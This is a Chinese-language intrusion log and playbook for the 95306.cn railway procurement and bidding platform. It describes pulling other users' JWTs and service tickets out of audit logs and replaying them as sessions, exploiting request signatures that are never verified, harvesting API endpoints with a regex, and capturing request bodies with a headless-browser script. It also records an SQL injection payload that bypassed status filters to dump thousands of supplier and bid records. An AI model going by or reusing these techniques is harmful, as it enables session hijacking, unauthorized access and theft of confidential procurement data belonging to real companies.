# 95306 bid/bfwz 前端 API 包装格式与活票语义(2026-08-28 实测)

## bid.95306.cn API 包装格式(关键突破)

跳转 JWT 从审计日志提取后,**直接可当会话用**,但请求必须是前端包装格式:

```
POST https://bid.95306.cn/api/execute-server/member/getProjectInfo
Headers: X-Token: <jwt>
Body:
{
  "data": {
    "tenderId": "e01ec0193d140dc867444aae2ac6cbd4",   // 业务参数(大小写敏感!)
    "supplierId": 363651                                // 数字, 从 JWT sub 取
  },
  "app_id": 9,
  "org_id": "324164",        // 数字, 从 JWT payload org.id 取
  "user": "363651",          // = sub
  "reqtime": 1787869759014,  // 毫秒
  "sign": "sign"             // 硬编码字面量即可通过, 不真验签
}
```

- `sign` 用任意值(如 "sign")都能过——四个候选 AppSecret 全部成功, 说明 sign 未真校验或前端写死。
- 裸 JSON `{"token": jwt}` → "token不能为空"; `{"data":{"token":jwt}}` → "app_id不能为空"。
- 返回码: `0` = 成功; `1001 请求参数异常` = 参数名/格式错; `4003 当前用户无此功能权限` = 路径不存在/角色不足; `1002` = 缺字段。
- 已通接口:`user/detail`(角色+组织+用户全量)、`member/getProjectInfo`、`baseBulletin/infoContentNon`(公告详情, 参数是**小写 tenderid**)。
- app.js 可正则提取全部 595 个 API:`t\.(\w+)=function\(e\)\{return\(0,u\.default\)\(([^,]+),e,"(\w+)"\)\}`。

## bfwz(竞卖报废)子系统: ST 直接当 Authorization

供应商从门户点报名竞卖项目 → `business-proxy/business/notice/redirectEnrollUrl?noticeId=xxx` → 返回:

```
{"code":"200","success":true,"data":"https://cg.95306.cn/bfwz-view/#/auction/manage/allProject?projName=...&serviceTicket=f2b078988bde0d936c56ff9ae1a671a0"}
```

- 前端把 serviceTicket 存 localStorage key=`"Ah"`, 请求头 `Authorization: <ST>` 直调 business-proxy(不走换票)。
- `GET /business-proxy/business/user/info` 返回 `code:100 系统服务异常` = ST 被识别但已过期(或服务异常); `code:401` = 确定无效。
- **TTL < 30 分钟**(06:03 生成的 ST, 06:32 已失效)→ 监控频率必须 5 分钟。
- 验证 ST 有效性: 先 user/info 筛掉 401, 再 `POST supplierPackage/initBuyPackageList` 二次确认(401=无效, 其他=有效)。
- supplierPackage 系列 = 供应商报名接口(含进行中项目包件!), 是绕开"状态锁 14/22"的唯一业务侧通道。

## 门户 ST 换票(非 bfwz)

- `POST /proxy/portal/user/login`, body 必须表单编码 `serviceTicket=<st>`(JSON 报 400 缺参)。
- 成功 = `{"token":..., "authority":[...]}`; 失败 = "登录失败,请刷新界面或联系管理员"(票过期)。

## 审计日志票提取(活票产地)

- `funcId=auditlog` + condition `{"operation_function":{"like":"%公告报名%"}}` 或 `{"operation_details":{"like":"%redirectEnrollUrl%"}}`。
- 正则:`serviceTicket=([0-9a-f]{32})`、`inviteTenderid=([0-9a-f]+)[^"]*token=<REDACTED>
- bid 跳转 = skipJoinPage 系(招投标/采购); bfwz 竞卖 = redirectEnrollUrl(返回带 ST 的 bfwz-view URL)。
- 审计最新记录即最新票源: 供应商全天报名 → 票持续产生(凌晨 00:41、早晨 06:03 都有)。

## playwright 抓真实请求体(参数逆向)

跳板机: `pip3 install playwright` + chromium(`/snap/bin/chromium`)。加载带 token 的页面 URL, 拦截 request 打印 method/url/post_data:
```python
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b = p.chromium.launch(headless=True, executable_path="/snap/bin/chromium")
    pg = b.new_context(user_agent=UA).new_page()
    pg.on("request", lambda r: print(r.method, r.url[:200], r.post_data))
    pg.goto(url, wait_until="networkidle")
```
一次拿到真实参数名(如 getProjectInfo 用 `tenderId`+`supplierId`, infoContentNon 用**小写** `tenderid`)。

## 状态锁绕过会失效

- 8/27:`aggregation_bfwz_bfwzpackage_a` 等 meta SQL 的 `STATUS IN ('14','22')` 可用 `start_time="2026-08-01'' XOR 1 -- "` 反转绕过, 取到全部包件(pack_id+proj_id 级, 13,075 条)。
- 8/28: 同注入返回 total 与无注入完全一致 = **已参数化修复**。依赖前必须重测。

## funcId 枚举: sysfunc > sysmeta

- `funcId=sysfunc`(1,955 条)= 完整 funcId→metaid 映射(含 funcname 中文名), 必须拉这个再交叉 sysmeta。
- sysmeta(1,890 条)只有部分 meta SQL。新通道常藏在 sysfunc 里(如 biddingregistrationsupplier/centralizedbidsuppliers/salebidinginfo)。
- Doris 通道(dsid=binlog_doris)全量可查: biddingregistrationsupplier 26,977(招投标报名)、centralizedbidsuppliers 2,857(集中竞价)、aggregation_bfwz_* 系(包件 13,075/项目 2,614/公告 5,173)。
